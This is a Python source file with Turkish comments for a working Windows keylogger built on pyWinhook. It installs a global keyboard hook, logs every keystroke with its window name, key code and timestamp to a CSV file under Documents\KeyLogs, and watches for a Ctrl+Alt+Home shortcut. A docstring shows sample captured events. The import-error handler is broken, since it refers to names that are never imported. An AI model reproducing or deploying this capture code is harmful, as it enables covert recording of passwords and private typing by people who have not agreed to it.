#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    import os, pyWinhook, pygame, atexit, pandas
    from datetime import datetime
except ImportError as ext:
    path = pyHook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(f" DLL dosyaları koypalanmalı!")
    print()
    print(f"     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print(f"     Kopyalanacağı dizin:")
    print(f"         C:\Windows\System32")
    quit()

#############################################
#               SABİT DEĞERLER              
#############################################

LVL_DEBUG = 2 # Tuş basımı dahil her bilgiyi gösterir 
LVL_INFO = 1  # Ek bilgileri de gösterir
LVL_NONE = 0  # Çıktı yok

#############################################
#            EVRENSEL DEĞİŞKENLER           
#############################################

LOG_ACTIVE = True
LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".csv"
LOG_LVL = LVL_INFO
KEY_LIMIT = 1
SHORTCUT = (162, 164, 36) # CTRL + ALT + HOME

#############################################yunusemreak
#                FONKSİYONLAR               
#############################################

def regData(event):
    datas = [
        datetime.utcnow(),
        event.Time,
        event.MessageName,
        event.Message,
        event.Window,
        event.WindowName,
        event.Ascii,
        event.Key,
        event.KeyID,
        event.ScanCode,
        event.Extended,
        event.Injected,
        event.Alt,
        event.Transition
    ]

    assert len(COLUMNS) == len(datas), "Sütun ile veri sayısı aynı değil :("
    DATA_FRAME.loc[len(DATA_FRAME)] = datas


def logDirectly():
    try:
        DATA_FRAME.to_csv(CONTEXT_FILE, header=CONTEXT_FILE.tell()==0)
        DATA_FRAME.drop(DATA_FRAME.index, inplace=True)
        CONTEXT_FILE.flush()
    except Exception as e:
        print(e)


def logOnReach(limit):
    if len(DATA_FRAME) >= limit:
        logDirectly()

def resetShortCut():
    global list_press
    list_press = [False, False, False]

def refreshShortcutPress():
    global isShortcut
    for press in list_press:
        if not press:
            isShortcut = False
            return

    isShortcut = True

def onShortCutPressed():
    if LOG_LVL >= LVL_INFO:
        print("Kısayola basıldı")

# TODO: Keydown ile halledebilirsim
#       Her keye basıldığında -> True, çekildiğinde -> False
#       Hepsi true ise kısayol aktif demektir
#       Daha sağlıklı (ama yorucu 😢)
def handleShortcutPressed(event):
    if event.KeyID == SHORTCUT[len(SHORTCUT) - 1]:
        refreshShortcutPress()
        if isShortcut:
            onShortCutPressed()
            return
    elif isShortcut:
        resetShortCut()

    global list_press
    for i in range(len(SHORTCUT)):
        if not list_press[i]:
            if SHORTCUT[i] == event.KeyID:
                list_press[i] = True
                break
            else:
                resetShortCut()
                break

    refreshShortcutPress()
    if isShortcut:
        onShortCutPressed()
        resetShortCut()


def OnKeyboardEvent(event):
    handleShortcutPressed(event)
    regData(event)
    logOnReach(KEY_LIMIT)

    return True

def openFile():
    if not LOG_ACTIVE:
        return

    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

    return open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")

def onexit():
    try:
        CONTEXT_FILE.close()
    except:
        pass

def pumpMessage():
    pygame.init()
    while True:
        pygame.event.pump()

#############################################
#           PROGRAMIN ÇALIŞMA YERI
############################################# 

""" 
UTC Time:    2019-06-26 21:29:34.847890
Boot Time:   244593
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Lcontrol
KeyID:       162
ScanCode:    29
Extended:    0
Injected:    0
Alt:         0
Transition:  0

UTC Time:    2019-06-26 21:29:34.913715
Boot Time:   244656
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Lmenu
KeyID:       164
ScanCode:    56
Extended:    0
Injected:    0
Alt:         0
Transition:  0

UTC Time:    2019-06-26 21:29:35.060320
Boot Time:   244796
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Home
KeyID:       36
ScanCode:    71
Extended:    1
Injected:    0
Alt:         0
Transition:  0 
"""

COLUMNS = [
    "UTC Time",
    "Boot Time",
    "MessageName",
    "Message",
    "Window",
    "WindowName",
    "Ascii",
    "Key",
    "KeyID",
    "ScanCode",
    "Extended",
    "Injected",
    "Alt",
    "Transition"
]

DATA_FRAME = pandas.DataFrame(columns=COLUMNS)
CONTEXT_FILE = openFile()
list_press = [False, False, False]
isShortcut = False

atexit.register(onexit) # TODO: Bunu nasıl aktif kılarım bilmiyorum

hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
